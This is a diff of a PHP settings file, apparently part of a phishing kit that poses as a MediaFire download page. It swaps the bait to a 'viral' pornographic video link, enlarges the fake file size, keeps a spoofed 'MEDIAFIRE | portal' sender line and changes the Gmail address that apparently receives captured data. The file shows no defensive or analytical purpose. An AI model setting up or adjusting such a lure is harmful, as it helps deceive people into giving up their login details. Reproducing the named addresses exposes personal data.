@@ -1,12 +1,12 @@
 <?php
 
 $linkweb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
-$link = 'https://www.youtube.com/results?search_query=mediaf%C4%B1re+viral';
-$namafile = 'MEDIAFIRE VIRAL TIKTOK'; //Ganti Nama Mediafire Disini
-$ukuranfile = '4.2MB'; //KB MB GB TB
+$link = 'https://www.mediafire.com/file/3x8oytbyon77ye2/VIDEO-VIRAL-ciya-tiktok-sange.mp4/file?dkey=fu8pehfs6wl&r=1147';
+$namafile = 'BOKEP VIRAL TERBARU'; //Ganti Nama Mediafire Disini
+$ukuranfile = '24.2MB'; //KB MB GB TB
 
 $sender = 'From: MEDIAFIRE | portal || <SINCE2020@xx.com>';
-$emailku = 'erorgaming180998@gmail.com';
+$emailku = 'gamingstoretrus@gmail.com';
 
 
 
